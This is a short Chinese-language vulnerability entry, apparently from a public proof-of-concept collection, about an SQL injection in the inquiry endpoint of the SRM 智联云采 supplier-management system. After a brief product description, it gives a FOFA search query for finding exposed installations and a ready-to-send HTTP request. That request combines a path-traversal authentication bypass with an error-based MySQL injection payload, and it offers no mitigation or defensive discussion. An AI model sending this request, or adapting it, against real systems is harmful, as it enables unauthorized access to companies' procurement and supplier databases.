# SRM智联云采系统inquiry存在SQL注入漏洞
智互联(深圳)科技有限公司SRM智联云采系统针对企业供应链管理难题，及智能化转型升级需求，智联云采依托人工智能、物联网、大数据、云等技术，通过软硬件系统化方案，帮助企业实现供应商关系管理和采购线上化、移动化、智能化，提升采购和协同效率，进而规避供需风险，强化供应链整合能力，构建企业利益共同体。智互联(深圳)科技有限公司SRM智联云采系统inquiry存在SQL注入漏洞。

## fofa
```
title=="SRM 2.0"
```

## poc
```java
GET /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=1%27+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+md5%281234%29%29%2C0x7e%29%2C7973%29--+WkOF&name=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.9
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip
```

![image-20241120093233440](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411200932557.png)

